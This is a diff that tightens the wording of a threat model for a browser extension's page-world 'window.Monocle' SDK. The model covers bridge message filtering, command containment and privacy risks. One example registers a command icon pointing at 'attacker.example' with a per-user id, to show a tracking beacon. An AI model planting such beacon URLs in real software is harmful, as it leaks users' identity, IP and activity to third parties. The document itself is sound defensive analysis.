@@ -1,19 +1,17 @@
 # Site SDK Security Model
 
-This document is the threat model for the page-world `window.Monocle` SDK and the
-content overlay it feeds. Read `docs/site-sdk.md` first for how the SDK works;
-this file covers what an untrusted page can and cannot do, why, and the residual
-risks worth tracking.
+Threat model for the page-world `window.Monocle` SDK and the content overlay it
+feeds. Read `docs/site-sdk.md` first for how the SDK works; this file covers what
+an untrusted page can and cannot do, why, and the residual risks worth tracking.
 
 The SDK is a runtime command source, not a permissioned plugin system. Its
-defining property is that **site callbacks run in the page, and SDK commands
-never gain extension privilege**. This document explains the boundaries that
-make that true and the risks that survive them.
+defining property: **site callbacks run in the page, and SDK commands never gain
+extension privilege**. This document explains the boundaries that make that true
+and the risks that survive them.
 
 ## Attacker model
 
-Be precise about who the attacker is, because the trust levels are very
-different:
+The trust levels differ sharply by actor:
 
 | Actor | Reach | Trust |
 | --- | --- | --- |
@@ -52,9 +50,9 @@ two message shapes from the page, both source-tagged `monocle-site-sdk`:
 
 The bridge does **not** relay arbitrary messages. A page cannot use it to emit
 `monocle-command-execute`, `monocle-commands-search`, `monocle-workflow-execute`, `monocle-permission-request`,
-or any other privileged message. Any analysis that assumes "the page drives the
-facade, which relays to the bridge, which reaches a privileged handler" is
-wrong: no such relay exists.
+or any other privileged message. There is no "page drives the facade, which
+relays to the bridge, which reaches a privileged handler" path: no such relay
+exists.
 
 The source markers are routing filters, not authentication. Any script running
 in the page can see and send same-window `postMessage` traffic with those marker
@@ -63,7 +61,7 @@ data and callback answers, never native command results or browser privileges.
 
 ### 3. SDK command execution never touches a privileged API
 
-This is the crux of containment. When a user runs a site command, the generated
+The crux of containment. When a user runs a site command, the generated
 background wrapper's `execute` (the `convertCommand` closures in
 `background/commands/siteSdk/commands.ts`) does exactly one thing:
 `invokeSiteSdk` sends a message back to the page so the page's own stored
@@ -152,13 +150,11 @@ per-site gating or opt-out. This is inherent to a page-world SDK, but
 A site can register a command with
 `icon: { type: "url", url: "https://attacker.example/px.png?u=<id>" }`. The
 palette renders it as a literal `<img src={icon.url}>` (the `icon.type === "url"`
-branch of `Icon` in `shared/components/Icon.tsx` routes to `UrlImageIcon`, whose
-`<img>` lives in that same `UrlImageIcon` component), so the URL is fetched from
-the user's
-browser at the moment the palette opens and that row is visible. The site
-learns: the palette was opened on their page, a unique per-user id, and the
-user's IP/timestamp. The schema forbids `data:` icons, so every URL icon is a
-network fetch.
+branch of `Icon` in `shared/components/Icon.tsx` routes to `UrlImageIcon`), so
+the URL is fetched from the user's browser when the palette opens and that row is
+visible. The site learns: the palette was opened on their page, a unique per-user
+id, and the user's IP/timestamp. The schema forbids `data:` icons, so every URL
+icon is a network fetch.
 
 Severity is low — the site already knows the user is present; the marginal
 signal is "uses Monocle and just opened it," and it cannot read anything. But it
@@ -196,8 +192,8 @@ loop `handle.update(...)` to force repeated index invalidation. The
 
 ### 1.6 Native favicon lookup can leak privileged domains (privacy, medium)
 
-This is adjacent to the SDK rather than caused by it, but it lives in the same
-palette rendering path and is a stronger privacy issue than site icon beacons.
+Adjacent to the SDK rather than caused by it, but it lives in the same palette
+rendering path and is a stronger privacy issue than site icon beacons.
 Bookmark and history commands resolve favicons through DuckDuckGo's icon service
 (`getDuckDuckGoFaviconUrl`, reached via `getFaviconUrl`, in
 `background/utils/favicon.ts`), and those commands are built from
